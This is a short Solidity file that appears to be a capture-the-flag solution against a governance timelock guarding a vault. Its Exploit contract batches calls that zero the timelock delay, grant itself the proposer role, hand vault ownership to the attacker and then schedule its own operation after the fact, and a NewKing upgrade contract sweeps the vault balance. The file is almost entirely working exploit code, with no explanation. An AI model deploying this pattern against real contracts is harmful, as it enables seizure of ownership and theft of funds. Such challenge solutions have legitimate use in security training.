// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
import "./TheKingIsDeadLongLiveTheKing.sol";

contract NewKing is KingVault{
    function sweepFundsFree() external {
        payable(address(0)).transfer(address(this).balance);
    }
}

contract Exploit {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    function doStuff(
        address _attacker,
        address _vault,
        address payable _thisTimelock
    ) public {
        // define all the values going into the schedule call, should be a way to do it prettier/faster than this but just gonna do what works for now

        address[] memory targets = new address[](4);
        targets[0] = _thisTimelock;
        targets[1] = _thisTimelock;
        targets[2] = _vault;
        targets[3] = address(this);

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );
        
        dataElements[2] = abi.encodeWithSignature(
            "transferOwnership(address)",
            _attacker
        );
        
        dataElements[3] = abi.encodeWithSignature(
            "doStuff(address,address,address)",
            _attacker,
            _vault,
            _thisTimelock
        );

        GovernanceTimelock(_thisTimelock).schedule(
            targets,
            values,
            dataElements,
            keccak256(abi.encodePacked("0x"))
        );
    }
}

  
